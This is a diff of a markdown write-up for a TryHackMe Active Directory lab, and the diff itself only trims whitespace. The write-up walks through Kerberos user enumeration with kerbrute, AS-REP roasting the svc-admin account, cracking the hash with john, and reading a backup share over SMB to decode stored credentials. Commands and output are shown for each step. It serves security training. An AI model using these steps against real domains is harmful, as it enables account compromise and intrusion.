@@ -37,11 +37,11 @@ run: `kerbrute userenum --dc $AD_IP -d THM-AD userlist.txt` to check which usern
 ```bash
 └─$ kerbrute userenum --dc 10.10.75.101 -d THM-AD userlist.txt                                              1 ⨯ 1 ⚙
 
-    __             __               __     
-   / /_____  _____/ /_  _______  __/ /____ 
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
  / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
-/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
 
 Version: v1.0.3 (9dad6e1) - 03/15/22 - Ronnie Flathers @ropnop
 
@@ -112,7 +112,7 @@ Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corpo
 let that run and check `$OUTPUT_FILE` for any successful usernames:
 
 ```bash
-$ cat kerb-user.txt 
+$ cat kerb-user.txt
 $krb5asrep$23$svc-admin@THM-AD@THM-AD:58f9aec0401e1853c840af5f369ac610$8efe1b2bb5373788a670aaa6ff41aead7359c0d5530ee970a34a22e54411d646d9bccc30d67efbe06e0774d9b8caf6a227ea8716307d006d937d0dc2bb449558292096b6fa84cedad7201bfc2c3ebe43e1ebf1fb0e1124dbe8089aadd8739683a3e638690eddc4667381457d34537cb5a6093d1f08d3bc04faafc57434d0105d4c00c0c6084af6f88a65a9e0159ae26ff036793bb9501d29003231f68089b4706c9efff58f366cafae0c6b4e08443fe36d9c9e858c6276c263ac76e8dc51bc856887433f33203aaf40053c19a4fecb42b7987a4036dbff228b370f70d3e5acd8c0047f6942a673a5e5
 ```
 
@@ -124,7 +124,7 @@ If you use the latest version of kerbrute it can do `ASREPRoast` at the same tim
 
 ## CRACK
 
-Use `hashid -jm <hash>` to lookup hash type.
+Use `hashid -jm <hash />` to lookup hash type.
 
 :::tip Hashcat TIP
 
@@ -145,18 +145,18 @@ hash-mode = `18200`
 Let's crack it with `john`: `john --wordlist=$WORDLIST $HASH_FILE`
 
 ```bash
-─$ john --wordlist=./passwordlist.txt kerb-user.txt       
+─$ john --wordlist=./passwordlist.txt kerb-user.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-management2005   ($krb5asrep$23$svc-admin@THM-AD@THM-AD)     
+management2005   ($krb5asrep$23$svc-admin@THM-AD@THM-AD)
 1g 0:00:00:01 DONE (2022-03-15 22:22) 0.9433g/s 6279p/s 6279c/s 6279C/s shearer..amy123
 Use the "--show" option to display all of the cracked passwords reliably
-Session completed. 
-                                                                                                                    
+Session completed.
+
 ┌──(kali㉿kali)-[~/…/RxHack/THM/OFFENSIVEPENTESTPATH/ATTACKTIVE]
-└─$ john --show kerb-user.txt                       
+└─$ john --show kerb-user.txt
 $krb5asrep$23$svc-admin@THM-AD@THM-AD:management2005
 
 1 password hash cracked, 0 left
@@ -180,7 +180,7 @@ Let's use `smbclient` to access the `backup` share we found from before:
 
 ```bash
 └─$ smbclient //10.10.81.46/backup -U svc-admin
-Enter WORKGROUP\svc-admin's password: 
+Enter WORKGROUP\svc-admin's password:
 Try "help" to get a list of possible commands.
 smb: \> dir
   .                                   D        0  Sun Apr  5 07:08:39 2020
@@ -188,14 +188,14 @@ smb: \> dir
   backup_credentials.txt              A       48  Sun Apr  5 07:08:53 2020
 
                 8247551 blocks of size 4096. 3578209 blocks available
-smb: \> 
+smb: \>
 ```
 
 Download and decode the credentials found in `backup_credentials.txt`:
 
 ```bash
 $ echo YmFja3VwQHNwb*************XAyNTE2ODYw | base64 -d
-backup@*********.local:************* 
+backup@*********.local:*************
 ```
 
 ### impacket scripts
